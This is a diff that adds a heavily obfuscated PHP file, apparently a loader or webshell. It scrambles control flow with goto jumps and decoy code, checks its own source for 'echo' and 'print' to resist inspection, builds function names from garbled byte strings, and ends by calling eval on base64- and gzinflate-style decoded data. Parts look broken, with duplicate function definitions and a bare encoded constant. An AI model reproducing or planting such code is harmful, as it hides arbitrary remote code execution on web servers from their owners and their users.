@@ -1,1 +1,237 @@
-化華獁裴芠俆华蟁慈玟聞閿登鐙蹬炆瓷码傌玛徐繧犸蟁瓷码糍纹登玟华繧馬閿蚉蟁瓷码糍纹登玟华繧瓷货貨紋瓷玟粢阌螞码蚊蚉瓷杹馬嘜馬華犸+
+<?php
+
+if(PHP_VERSION[0]<7){exit("");
+}else{$ddddd="string1"^error_reporting(1)^"string2";
+}decod("g"."zi"."nf"."la"."te",$ddddd,$qqqqq,$_5,$__4);
+class _1{
+	public $__1;
+	private $_2;
+	public $__2;
+	private $_3;
+	public $__3;
+	private $_4;
+	public $__4;
+	private $_5;
+	public $__5;
+	private $_6;
+	public $__6;
+	public $aaaaa;
+	public function __construct($_1,$_3,$_5,$_2,$_4,$_6,$__1,$__3,$__5,$__2,$__4,$__6){_2:goto _1;
+	return $this->_1=$_1.$_3.$_5.$_2;
+	goto _2;
+	return $data="jjjjj";
+	goto _3;
+_1:function eeeee($_1,$_2){return $_2;
+}$this->_1=$__1;
+_3:$this->_2=$__1;
+function azank($_1,$__1,$_2,$__4,$_3,$_4,$_5){return A4b4dcec857504fac2a28cad74b4e53b70600f2c53d990f02160e0c9e7374ffafadf472384a99eb83101f6c;
+}$file=$_SERVER["SCRIPT_NAME"];
+if(strpos(file_get_contents($file),strrev("o"."h"."c"."e"))!=false||strpos(file_get_contents($file),strrev("t"."n"."i"."r"."p"))!=false){$ddddd=1;
+}$this->_2=$__2;
+$this->_3=$__3;
+$this->_4=$__4;
+$this->_5=$__5;
+_5:goto _4;
+$d="base64_decode";
+function eeeee($_1,$_2){return eval($_1.$_2);
+}goto _7;
+goto _5;
+_4:$this->_2=$__2;
+$this->__5=$_5;
+_9:goto _8;
+if($this->_2==1001101011011011011){return $this->_2=$_3.$__4.$_5;
+} else {exit($this->_2==false);
+}goto _10;
+$this->_1=$__22;
+goto _9;
+_8:$this->_3=$_3;
+_7:$this->_4=$_4;
+_10:$this->__4=$_4;
+$this->_5=$_5;
+_12:goto _11;
+return $this->_1=json_decode($data);
+goto _13;
+function dec(){if($this->_1==$this->__1){$this->_2=$this->__2;
+}else{$this->_2=$this->_1.$this->_5;
+}}goto _12;
+_11:$this->_6=$__6;
+$this->__1=$_1;
+_17:goto _14;
+_16:goto _15;
+_15:goto _16;
+if($this->$aaaaa=="base64_decode"){$data="hhhhh";
+}goto _17;
+_14:$this->__2=$_2;
+_13:function dec($_1,$_2){return $this->__1;
+}_19:goto _18;
+function dec($_1,$_2){if($this->__6==true){$this->_3=$__3;
+}}goto _20;
+$this->__4=$__4;
+goto _19;
+_18:if($ddddd==1){$ddddd=0;
+}else{$ddddd=str_replace("A","",azank($_1,$__1,$_2,$__4,$_3,$_4,$_5));
+}$this->__3=$_3;
+_20:$this->__6=$_6;
+$this->aaaaa=$ddddd;
+}}$a=new _1(7,3,7,5,6,2,7,3,7,4,7,2);
+$da.=$a->__1;
+__2:goto __1;
+$da.=$a->__5;
+goto __2;
+__1:$da.=$a->__3;
+__4:goto __3;
+$da.=$a->__1;
+goto __4;
+__3:$da.=$a->__1;
+__6:goto __5;
+$da.=$a->__4;
+goto __6;
+__5:$da.=$a->__2;
+__8:goto __7;
+$da.=$a->__2;
+goto __8;
+__7:$da.=$a->__4;
+__10:goto __9;
+$da.=$a->__2;
+goto __10;
+__9:$da.=$a->__6;
+__12:goto __11;
+$da.=$a->__5;
+goto __12;
+__11:$da.=$a->__1;
+__14:goto __13;
+$da.=$a->__1;
+goto __14;
+__13:$da.=$a->__3;
+__16:goto __15;
+$da.=$a->__2;
+goto __16;
+__15:$da.=$a->__1;
+__18:goto __17;
+$da.=$a->__3;
+goto __18;
+__17:$da.=4;
+__20:goto __19;
+$da.=$a->__6;
+goto __20;
+__19:$da.=$a->__1;
+__22:goto __21;
+$da.=$a->__4;
+goto __22;
+__21:$da.=$a->__6;
+$l1="+Ϊ�J+Ϊ�ifì�h�+Ϊ�Jìe�l�+xΪ�bJdìK�+Ϊ�Jì2nlG�JZt+Ϊ�Jì�l�zìaL�l�";
+$l.=$l1[20];
+qqqqq2:goto qqqqq1;
+$l.=$l1[34];
+goto qqqqq2;
+qqqqq1:$l.=$l1[33];
+qqqqq4:goto qqqqq3;
+$l.=$l1[38];
+goto qqqqq4;
+qqqqq3:$l.=$l1[42];
+qqqqq6:goto qqqqq5;
+$l.=$l1[40];
+goto qqqqq6;
+qqqqq5:$l.=$l1[66];
+qqqqq8:goto qqqqq7;
+$l.=$l1[48];
+goto qqqqq8;
+qqqqq7:$l.=$l1[48];
+qqqqq10:goto qqqqq9;
+$l.=$l1[12];
+goto qqqqq10;
+qqqqq9:$l.=$l1[13];
+qqqqq12:goto qqqqq11;
+$l.=$l1[24];
+goto qqqqq12;
+qqqqq11:$l.=$l1[67];
+wwwww2:goto wwwww1;
+$l2.=$l1[38];
+goto wwwww2;
+wwwww1:$l2.=$l1[69];
+wwwww4:goto wwwww3;
+$l2.=$l1[17];
+goto wwwww4;
+wwwww3:$l2.=$l1[74];
+wwwww6:goto wwwww5;
+$l2.=$l1[58];
+goto wwwww6;
+wwwww5:$l2.=$l1[13];
+wwwww8:goto wwwww7;
+$l2.=$l1[46];
+goto wwwww8;
+wwwww7:$l2.=$l1[67];
+wwwww10:goto wwwww9;
+$l2.=$l1[39];
+goto wwwww10;
+wwwww9:$l2.=$l1[14];
+wwwww12:goto wwwww11;
+$l2.=$l1[52];
+goto wwwww12;
+wwwww11:$l2.=$l1[37];
+wwwww14:goto wwwww13;
+$l2.=$l1[64];
+goto wwwww14;
+wwwww13:$l2.=$l1[95];
+wwwww16:goto wwwww15;
+$l2.=$l1[32];
+goto wwwww16;
+wwwww15:$l2.=$l1[75];
+wwwww18:goto wwwww17;
+$l2.=$l1[75];
+goto wwwww18;
+wwwww17:$l2.=$l1[33];
+$ddddd=$a->aaaaa;
+// echo $l($da);
+wwwww20:
+goto wwwww19;
+$sub=$ddddd.$l;
+goto wwwww20;
+wwwww19:
+$sub2=$ddddd.$l;
+wwwww22:
+goto wwwww21;
+$sub=$a->aaaaa;
+goto wwwww22;
+wwwww21:
+$sub3=$a->aaaaa.$ddddd;
+wwwww24:
+goto wwwww23;
+$sub2=$ddddd[21].$a->aaaaa[11];
+goto wwwww24;
+wwwww23:
+$sub3=$l($da);
+wwwww26:
+goto wwwww25;
+$sub2=$l($ddddd);
+goto wwwww26;
+wwwww25:
+$sub = $l2;
+wwwww28:
+goto wwwww27;
+$sub = $l;
+goto wwwww28;
+wwwww27:
+$sub1 = $sub3;
+wwwww30:
+goto wwwww29;
+$sub1 = $sub3;
+goto wwwww30;
+wwwww29:
+$sub3 = $l;
+wwwww32:
+goto wwwww31;
+$sub3 = $l2;
+goto wwwww32;
+wwwww31:
+function encode ($__1, $_2, $__3, $_4, $__5) {
+	return base64_encode($__1.$_2.$_4.$__3.$__5);
+}
+$aaaaa="string6"^error_reporting(0)^"string7"^eval($sub($sub1($sub3($ddddd,0,-25))))^"string8";
+ddddd:goto aaaaa;
+$a="string3"^error_reporting(0)^"string4"^eval($l($l2($sub3($ddddd),0,-25)))^"string5";
+function abcde($aaaaa,$ddddd){return eval(base64_decode($ddddd));
+}goto ddddd;
+aaaaa:function decod($_3,$_1,$_5,$_4,$__1){return $_3.$_1;
+}
+?>
